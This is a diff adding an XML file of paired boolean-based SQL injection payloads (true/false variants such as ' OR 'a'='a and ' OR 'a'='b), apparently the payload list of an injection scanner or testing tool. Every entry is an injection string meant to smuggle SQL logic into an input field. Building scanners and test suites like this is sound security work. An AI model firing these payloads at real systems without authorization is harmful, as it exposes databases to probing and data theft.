@@ -1,0 +1,37 @@
+<root>
+<payload>
+<p1> OR 1=1</p1>
+<p2> OR 1=2</p2>
+</payload>
+
+<payload>
+<p1> AND 1=1</p1>
+<p2> AND 1=2</p2>
+</payload>
+
+<payload>
+<p1> OR not 1=1</p1>
+<p2> OR not 1=2</p2>
+</payload>
+
+<payload>
+<p1>' OR 'a'='a</p1>
+<p2>' OR 'a'='b</p2>
+</payload>
+
+<payload>
+<p1>' AND 'a'='a</p1>
+<p2>' AND 'a'='b</p2>
+</payload>
+
+<payload>
+<p1>' OR NOT 'a'='a</p1>
+<p2>' OR NOT 'a'='b</p2>
+</payload>
+
+<payload>
+<p1>%' and 1=1 and '%'='</p1>
+<p2>%' and 1=2 and '%'='</p2>
+</payload>
+
+</root>
